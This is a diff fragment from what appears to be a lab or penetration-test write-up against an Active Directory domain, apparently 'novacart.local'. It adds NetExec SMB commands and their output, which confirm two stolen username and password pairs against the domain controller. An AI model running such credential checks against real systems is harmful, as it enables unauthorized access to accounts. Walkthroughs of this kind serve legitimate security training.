@@ -267,7 +267,16 @@ d.barowski:kubarow
 I will now validate these credentials
 
 ```python
+nxc smb dc.novacart.local -u 'j.paul' -p 'password123'                          
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123
 
+nxc smb dc.novacart.local -u 'd.barowski' -p 'kubarow'
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\d.barowski:kubarow
 ```
+Both users are compromised here!
+
+
 
 
